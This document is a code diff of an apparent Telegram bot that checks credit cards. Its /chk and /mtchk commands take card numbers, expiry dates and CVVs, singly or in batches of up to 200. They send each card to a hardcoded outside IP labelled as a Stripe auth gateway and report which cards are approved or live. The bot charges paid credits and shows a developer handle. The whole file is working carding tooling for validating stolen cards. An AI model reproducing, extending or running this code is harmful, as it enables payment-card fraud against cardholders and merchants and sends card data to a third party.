@@ -1042,10 +1042,7 @@ async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int =
     now = datetime.now().timestamp()
     if now - last_run < cooldown_seconds:
         await update.effective_message.reply_text(
-            escape_markdown(
-                f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.",
-                version=2
-            ),
+            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
             parse_mode=ParseMode.MARKDOWN_V2
         )
         return False
@@ -1053,20 +1050,15 @@ async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int =
     return True
 
 async def consume_credit(user_id: int) -> bool:
-    """Consume 1 credit from DB user if available."""
+    """
+    Consume 1 credit from DB user if available.
+    """
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
         new_credits = user_data["credits"] - 1
         await update_user(user_id, credits=new_credits)
         return True
     return False
-
-async def refund_credit(user_id: int):
-    """Refund 1 credit if an error happens."""
-    user_data = await get_user(user_id)
-    if user_data:
-        new_credits = user_data.get("credits", 0) + 1
-        await update_user(user_id, credits=new_credits)
 
 def get_bin_details_sync(bin_number: str) -> dict:
     # Simulate BIN lookup or call your actual BIN service here
@@ -1077,8 +1069,12 @@ def get_bin_details_sync(bin_number: str) -> dict:
         "country_name": "United States"
     }
 
+
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
-    """Handles the background processing for the /chk command."""
+    """
+    Handles the background processing for the /chk command.
+    It performs a BIN lookup, calls the external API, and formats the final message.
+    """
     start_time = time.time()
     try:
         bin_number = parts[0][:6]
@@ -1087,18 +1083,22 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         issuer = (bin_details.get("type") or "N/A").upper()
         country_name = (bin_details.get("country_name") or "N/A").upper()
 
+        # New API URL from your request
         api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
-
+        
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=25) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
 
+        # The new API response only contains "card" and "status"
+        # Removed emoji stripping to preserve the emojis in the status string
         api_status = (data.get("status") or "Unknown").strip()
+        
         time_taken = round(time.time() - start_time, 2)
 
-        # Pretty formatting for statuses
+        # Updated header logic to use the original style with proper bolding
         status_text = api_status.upper()
         if api_status.lower() == "approved ✅":
             status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
@@ -1106,31 +1106,31 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
         elif api_status.lower() == "ccn live ❎":
             status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
-
+            
         header = f"═══\\[ **{escape_markdown(status_text, version=2)}** \\]═══"
+
+        # Formatted response from API status
         formatted_response = f"_{escape_markdown(api_status, version=2)}_"
 
         final_text = (
             f"{header}\n"
             f"✘ Card         ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
-            f"✘ Gateway      ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘵𝗵\n"
+            "✘ Gateway      ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
             f"✘ Response     ➜ {formatted_response}\n"
-            f"――――――――――――――――\n"
+            "――――――――――――――――\n"
             f"✘ Brand        ➜ {escape_markdown(brand, version=2)}\n"
             f"✘ Issuer       ➜ {escape_markdown(issuer, version=2)}\n"
             f"✘ Country      ➜ {escape_markdown(country_name, version=2)}\n"
-            f"――――――――――――――――\n"
+            "――――――――――――――――\n"
             f"✘ Request By   ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan', 'Free'), version=2)}\\]\n"
             f"✘ Developer    ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
             f"✘ Time         ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
-            f"――――――――――――――――"
+            "――――――――――――――――"
         )
 
         await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
 
     except Exception as e:
-        # Refund credit on failure
-        await refund_credit(user.id)
         await processing_msg.edit_text(
             f"❌ API Error: {escape_markdown(str(e), version=2)}",
             parse_mode=ParseMode.MARKDOWN_V2
@@ -1138,17 +1138,24 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    chat = update.effective_chat
     user_id = user.id
 
     # Get user data
     user_data = await get_user(user_id)
     if not user_data:
-        await update.effective_message.reply_text("❌ Could not fetch your user data. Try again later.")
+        await update.effective_message.reply_text(
+            "❌ Could not fetch your user data. Try again later.",
+            parse_mode=None
+        )
         return
 
     # Check credits
     if user_data.get("credits", 0) <= 0:
-        await update.effective_message.reply_text("❌ You have no credits left. Please buy a plan to get more credits.")
+        await update.effective_message.reply_text(
+            "❌ You have no credits left. Please buy a plan to get more credits.",
+            parse_mode=None
+        )
         return
 
     # Cooldown check
@@ -1163,12 +1170,18 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         raw = ' '.join(context.args).strip()
 
     if not raw or "|" not in raw:
-        await update.effective_message.reply_text("Usage: reply with number|mm|yy|cvv or use /chk number|mm|yy|cvv")
+        await update.effective_message.reply_text(
+            "Usage: reply to a message containing number|mm|yy|cvv or use /chk number|mm|yy|cvv",
+            parse_mode=None
+        )
         return
 
     parts = raw.split("|")
     if len(parts) != 4:
-        await update.effective_message.reply_text("Invalid format. Use number|mm|yy|cvv (or yyyy for year).")
+        await update.effective_message.reply_text(
+            "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
+            parse_mode=None
+        )
         return
 
     # Normalize year
@@ -1178,12 +1191,15 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Deduct credit
     if not await consume_credit(user_id):
-        await update.effective_message.reply_text("❌ No credits left.")
+        await update.effective_message.reply_text(
+            "❌ No credits left.",
+            parse_mode=None
+        )
         return
 
     # Send processing message
     processing_text = (
-        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑁𝑮 \\]═══\n"
+        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
         f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
         "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘵𝗵\n"
         "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
@@ -1196,7 +1212,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Start background task
     asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))
-
 
 import asyncio
 import time
@@ -1390,34 +1405,73 @@ import aiohttp
 from telegram import Update, InputFile
 from telegram.ext import ContextTypes
 from telegram.error import BadRequest
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+
+from db import get_user, update_user  # Your DB functions
 
 OWNER_ID = 8438505794
-last_mtchk_usage = {}
+user_cooldowns = {}
+
+# ─── Authorization & Credits ──────────────────────
+async def check_authorization(update: Update) -> bool:
+    if update.effective_chat.type == "private":
+        return update.effective_user.id == OWNER_ID
+    return True
+
+async def enforce_cooldown(user_id: int, update: Update) -> bool:
+    cooldown = 5
+    now = time.time()
+    last = user_cooldowns.get(user_id, 0)
+    if now - last < cooldown:
+        remaining = round(cooldown - (now - last), 2)
+        await update.effective_message.reply_text(
+            escape_markdown(f"⏳ Cooldown active. Wait {remaining}s.", version=2),
+            parse_mode=ParseMode.MARKDOWN_V2,
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """
+    Consume 1 credit per command
+    """
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+# ─── Helper ───────────────────────────────────────
+def normalize_status_text(s: str) -> str:
+    mapping = {
+        '𝑨': 'A', '𝒑': 'p', '𝒓': 'r', '𝒐': 'o', '𝒗': 'v', '𝒆': 'e', '𝒅': 'd',
+        '𝑫': 'D', '𝒄': 'c', '𝒍': 'l', '𝒊': 'i', '𝒏': 'n', '𝐞': 'e',
+        '𝐂': 'C', '𝐚': 'a', '𝐫': 'r', '𝐝': 'd', '𝐥': 'l', '𝐢': 'i',
+        '𝐍': 'N', '𝐋': 'L', '𝐯': 'v', '𝟑': '3', '𝗗': 'D', '𝗖': 'C',
+        '𝗵': 'h', '𝗴': 'g', '𝗾': 'q', '𝘂': 'u', '𝗥': 'R', '𝗲': 'e',
+    }
+    return "".join(mapping.get(char, char) for char in s)
 
 # ─── /mtchk Handler ────────────────────────────────
 async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Handles the /mtchk command, which performs a mass check of credit cards
-    from a text file. It enforces cooldowns and validates the input file.
-    """
     user_id = update.effective_user.id
-    now = time.time()
 
-    # Restrict private use except for the owner
-    if update.effective_chat.type == "private" and user_id != OWNER_ID:
-        await update.message.reply_text("❌ This command is not allowed in private chats.")
+    # Authorization
+    if not await check_authorization(update):
+        await update.message.reply_text("❌ You are not authorized to use this command.")
         return
 
-    # Cooldown (7 seconds for non-owner)
-    if user_id != OWNER_ID:
-        if user_id in last_mtchk_usage and now - last_mtchk_usage[user_id] < 7:
-            remaining = int(7 - (now - last_mtchk_usage[user_id]))
-            await update.message.reply_text(
-                f"⚠️ Slow down!\n"
-                f"⏳ You must wait `{remaining}s` before using /mtchk again."
-            )
-            return
-        last_mtchk_usage[user_id] = now
+    # Cooldown
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Consume credit
+    if not await consume_credit(user_id):
+        await update.message.reply_text("❌ You don't have enough credits to run this command.")
+        return
 
     # Ensure a .txt file is attached or replied to
     if not update.message.document and not (
@@ -1431,46 +1485,31 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Only `.txt` files are supported.")
         return
 
+    # Download file
     file = await context.bot.get_file(document.file_id)
     file_path = await file.download_to_drive(custom_path="input_cards.txt")
 
-    # Read cards from the file
+    # Read cards
     with open(file_path, "r", encoding="utf-8") as f:
         cards = [line.strip() for line in f if line.strip()]
 
-    # Validate number of cards
     if len(cards) > 200:
         await update.message.reply_text("⚠️ Maximum 200 cards allowed per file.")
         return
 
-    # Send initial processing message
-    processing_msg = await update.message.reply_text("🔄 Preparing Mass Stripe Auth check...")
+    # Send initial fancy progress bar
+    processing_msg = await update.message.reply_text(
+        f"╔══ 🔥 Mass Stripe Auth 🔥 ══╗\n"
+        f"  [░░░░░░░░░░] 0/{len(cards)}\n"
+        f"  🌐 Gateway: Mass Stripe Auth\n"
+        f"╚══════════════════════════╝"
+    )
 
-    # Run background task to process the cards
+    # Start background task
     asyncio.create_task(background_check(update, context, cards, processing_msg))
 
-
-# ─── Helper function to normalize text ────────────────
-def normalize_status_text(s: str) -> str:
-    """Replaces stylized characters with standard ASCII equivalents."""
-    # This mapping covers the specific stylized characters from your API response
-    mapping = {
-        '𝑨': 'A', '𝒑': 'p', '𝒓': 'r', '𝒐': 'o', '𝒗': 'v', '𝒆': 'e', '𝒅': 'd',
-        '𝑫': 'D', '𝒄': 'c', '𝒍': 'l', '𝒊': 'i', '𝒏': 'n', '𝐞': 'e',
-        '𝐂': 'C', '𝐚': 'a', '𝐫': 'r', '𝐝': 'd', '𝐥': 'l', '𝐢': 'i',
-        '𝐍': 'N', '𝐋': 'L', '𝐯': 'v', '𝟑': '3', '𝗗': 'D', '𝗖': 'C',
-        '𝗵': 'h', '𝗴': 'g', '𝗾': 'q', '𝘂': 'u', '𝗥': 'R', '𝗲': 'e',
-    }
-    normalized = ""
-    for char in s:
-        normalized += mapping.get(char, char)
-    return normalized
-
-# ─── Background Task ────────────────────────────────
+# ─── Background Task ──────────────────────────────
 async def background_check(update, context, cards, processing_msg):
-    """
-    Performs the actual mass card checking in the background.
-    """
     results = []
     approved = declined = threed = live = 0
     total = len(cards)
@@ -1484,20 +1523,16 @@ async def background_check(update, context, cards, processing_msg):
                     timeout=20
                 ) as resp:
                     if resp.status != 200:
-                        raise aiohttp.ClientError(f"HTTP Error {resp.status}")
+                        raise aiohttp.ClientError(f"HTTP {resp.status}")
                     data = await resp.json()
                     status = data.get("status", "Unknown")
             except Exception as e:
                 status = f"Error: {str(e)}"
 
-            # Store card + status for the output file
-            line = f"{card} → {status}"
-            results.append(line)
+            results.append(f"{card} → {status}")
 
-            # Count the different statuses
-            normalized_status = normalize_status_text(status)
-            st_low = normalized_status.lower().strip()
-
+            # Count statuses
+            st_low = normalize_status_text(status).lower().strip()
             if st_low.startswith("approved"):
                 approved += 1
             elif st_low.startswith("declined"):
@@ -1506,58 +1541,54 @@ async def background_check(update, context, cards, processing_msg):
                 threed += 1
             elif st_low.startswith("ccn live"):
                 live += 1
-            
-            # Progress bar update (every 10 cards to reduce edits)
-            if i % 10 == 0 or i == total:
+
+            # Fancy progress bar update every 2 cards
+            if i % 2 == 0 or i == total:
                 percent = int((i / total) * 100)
-                filled = "█" * (percent // 10)
-                empty = "░" * (10 - (percent // 10))
-                elapsed = time.time() - start_time
-                eta = int((elapsed / i) * (total - i)) if i > 0 else 0
+                filled_len = percent // 5  # 20 blocks
+                empty_len = 20 - filled_len
+                filled = "█" * filled_len
+                empty = "░" * empty_len
+
+                # Show percent inside the bar
+                bar = f"{filled}{empty} {percent}%"
 
                 progress_text = (
-                    "╔══ 🔥 Mass Stripe Auth 🔥 ══╗\n"
-                    f"  [{filled}{empty}] {percent}%\n"
-                    f"  ✅ Checked: {i}/{total}\n"
-                    f"  ⏳ ETA: {eta}s\n"
-                    "╚══════════════════════════╝"
+                    f"╔══ 🔥 Mass Stripe Auth 🔥 ══╗\n"
+                    f"  [{bar}] {i}/{total}\n"
+                    f"  🌐 Gateway: Mass Stripe Auth\n"
+                    f"╚══════════════════════════╝"
                 )
                 try:
                     await processing_msg.edit_text(progress_text)
                 except BadRequest:
-                    # This specific exception is raised when the message has already
-                    # been edited or deleted by the user or another bot instance.
-                    # We pass silently as there's nothing else to do.
                     pass
                 except Exception:
-                    # Catch any other unexpected exceptions during the edit.
                     pass
 
-    # Write all results to the output file
+    # Save results
     output_filename = "checked.txt"
     with open(output_filename, "w", encoding="utf-8") as f:
-        for line in results:
-            f.write(line + "\n")
+        f.write("\n".join(results))
 
-    # Delete the progress message
+    # Delete progress bar
     try:
         await processing_msg.delete()
     except Exception:
         pass
 
-    # Build the final summary for the caption
+    # Final summary
     summary = (
         "✅ Mass Stripe Auth Check Completed!\n\n"
-        f"📊 Total Checked: {total}\n"
-        f"✅ Approved : {approved}\n"
-        f"❌ Declined : {declined}\n"
-        f"⚠️ 3DS      : {threed}\n"
-        f"💳 CCN Live: {live}\n"
-        "━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Total Checked : {total}\n"
+        f"✅ Approved      : {approved}\n"
+        f"❌ Declined      : {declined}\n"
+        f"⚠️ 3DS           : {threed}\n"
+        f"💳 CCN Live     : {live}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "🌐 Gateway = Mass Stripe Auth"
     )
 
-    # Send the output file
     try:
         with open(output_filename, "rb") as f:
             await update.message.reply_document(
@@ -1565,8 +1596,7 @@ async def background_check(update, context, cards, processing_msg):
                 caption=summary
             )
     except Exception as e:
-        await update.message.reply_text(f"❌ An error occurred while sending the file: {e}")
-
+        await update.message.reply_text(f"❌ Failed to send results: {e}")
 
 
 import asyncio
